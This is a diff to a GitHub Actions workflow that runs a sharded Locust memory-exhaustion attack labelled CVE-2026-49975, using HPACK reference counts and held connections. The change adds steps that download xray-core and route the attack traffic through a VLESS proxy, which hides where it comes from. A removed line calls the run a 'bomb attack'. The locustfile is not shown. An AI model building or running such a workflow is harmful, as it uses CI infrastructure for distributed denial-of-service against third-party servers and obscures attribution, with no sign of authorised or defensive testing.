@@ -1,4 +1,4 @@
-name: CVE-2026-49975 分布式内存消耗测试（支持代理）
+name: CVE-2026-49975 + VLESS 代理测试
 
 on:
   workflow_dispatch:
@@ -20,24 +20,28 @@ on:
         required: true
         default: '5'
       hpack_references:
-        description: '5. HPACK 引用次数（1024~4096）'
+        description: '5. HPACK 引用次数'
         required: false
         default: '2048'
       hold_seconds:
-        description: '6. 连接保持秒数（10~30）'
+        description: '6. 连接保持秒数'
         required: false
         default: '15'
-      # ===== 新增：代理配置 =====
-      proxy_url:
-        description: '7. 代理 URL（留空则直连，支持 socks5:// http:// https://）'
+      vless_uri:
+        description: '7. VLESS URI (vless://开头)'
         required: false
         default: ''
-      socks5_user:
-        description: '8. SOCKS5 用户名（留空则无认证）'
+      # VLESS 手动配置（如果上面 URI 为空）
+      vless_server:
+        description: '8. VLESS 服务器地址（备用）'
         required: false
         default: ''
-      socks5_pass:
-        description: '9. SOCKS5 密码'
+      vless_port:
+        description: '9. VLESS 端口（备用）'
+        required: false
+        default: ''
+      vless_uuid:
+        description: '10. VLESS UUID（备用）'
         required: false
         default: ''
 
@@ -73,8 +77,103 @@ jobs:
       - name: Install Dependencies
         run: |
           pip install locust==2.32.2
-          pip install PySocks  # SOCKS 代理支持
+          pip install PySocks
 
+      # ===== 启动 xray-core 转发 VLESS =====
+      - name: Setup xray-core
+        if: inputs.vless_uri != '' || inputs.vless_server != ''
+        run: |
+          # 下载 xray-core
+          curl -L https://github.com/XTLS/Xray-core/releases/latest/download/Xray-linux-64.zip -o xray.zip
+          unzip -o xray.zip xray -d /usr/local/bin/
+          chmod +x /usr/local/bin/xray
+          xray version
+
+      - name: Generate xray config
+        id: xray-config
+        if: inputs.vless_uri != '' || inputs.vless_server != ''
+        run: |
+          VLESS_URI="${{ github.event.inputs.vless_uri }}"
+          VLESS_SERVER="${{ github.event.inputs.vless_server }}"
+          VLESS_PORT="${{ github.event.inputs.vless_port }}"
+          VLESS_UUID="${{ github.event.inputs.vless_uuid }}"
+
+          if [ -n "$VLESS_URI" ]; then
+            echo "检测到 VLESS URI 格式"
+            # VLESS URI: vless://uuid@server:port?param
+            UUID=$(echo "$VLESS_URI" | sed 's|vless://||' | sed 's|@.*||')
+            SERVER_PORT=$(echo "$VLESS_URI" | sed 's|vless://[^@]*@||' | cut -d'?' -f1)
+            SERVER=$(echo "$SERVER_PORT" | cut -d':' -f1)
+            PORT=$(echo "$SERVER_PORT" | cut -d':' -f2)
+          else
+            SERVER="$VLESS_SERVER"
+            PORT="$VLESS_PORT"
+            UUID="$VLESS_UUID"
+          fi
+
+          echo "服务器: $SERVER"
+          echo "端口: $PORT"
+          echo "UUID: $UUID"
+
+          # 生成 xray 配置文件（TCP 透明代理 -> SOCKS5 本地 10808）
+          cat > xray_config.json << 'EOF'
+          {
+            "log": {"loglevel": "warning"},
+            "inbounds": [
+              {
+                "listen": "127.0.0.1",
+                "port": 10808,
+                "protocol": "socks",
+                "settings": {"auth": "noauth", "udp": true}
+              }
+            ],
+            "outbounds": [
+              {
+                "protocol": "vless",
+                "settings": {
+                  "vnext": [
+                    {
+                      "address": "SERVER_PLACEHOLDER",
+                      "port": PORT_PLACEHOLDER,
+                      "users": [{"id": "UUID_PLACEHOLDER", "alterId": 0, "security": "auto"}]
+                    }
+                  ]
+                },
+                "streamSettings": {
+                  "network": "tcp",
+                  "security": "none",
+                  "tcpSettings": {"header": {"type": "none"}}
+                }
+              }
+            ]
+          }
+          EOF
+
+          # 替换占位符
+          sed -i "s|SERVER_PLACEHOLDER|$SERVER|g" xray_config.json
+          sed -i "s|PORT_PLACEHOLDER|$PORT|g" xray_config.json
+          sed -i "s|UUID_PLACEHOLDER|$UUID|g" xray_config.json
+
+          cat xray_config.json
+
+          echo "socks_proxy=socks5://127.0.0.1:10808" >> $GITHUB_OUTPUT
+
+      - name: Start xray proxy
+        if: inputs.vless_uri != '' || inputs.vless_server != ''
+        run: |
+          # 后台启动 xray
+          nohup xray run -config xray_config.json > xray.log 2>&1 &
+          echo "xray PID: $!"
+          sleep 3
+          # 验证 xray 是否启动成功
+          if curl -s --socks5 127.0.0.1:10808 http://www.google.com > /dev/null 2>&1; then
+            echo "✅ xray SOCKS5 代理启动成功"
+          else
+            echo "⚠️ xray 可能未正常启动，检查日志:"
+            cat xray.log
+          fi
+
+      # ===== 运行 Locust 测试 =====
       - name: 💣 CVE-2026-49975 Bomb Test - Shard ${{ matrix.shard }}
         run: |
           locust -f locustfile.py \
@@ -86,10 +185,8 @@ jobs:
         env:
           LOCUST_REFERENCES: ${{ github.event.inputs.hpack_references }}
           LOCUST_HOLD_SECONDS: ${{ github.event.inputs.hold_seconds }}
-          # 代理配置（留空则直连）
-          SOCKS5_PROXY: ${{ github.event.inputs.proxy_url }}
-          SOCKS5_USER: ${{ github.event.inputs.socks5_user }}
-          SOCKS5_PASS: ${{ github.event.inputs.socks5_pass }}
+          # 如果用了 xray，指向本地 SOCKS5
+          SOCKS5_PROXY: ${{ steps.xray-config.outputs.socks_proxy || '' }}
 
       - name: ✅ Shard ${{ matrix.shard }} 完成
-        run: echo "Shard ${{ matrix.shard }} 炸弹攻击完成"
+        run: echo "Shard ${{ matrix.shard }} 完成"
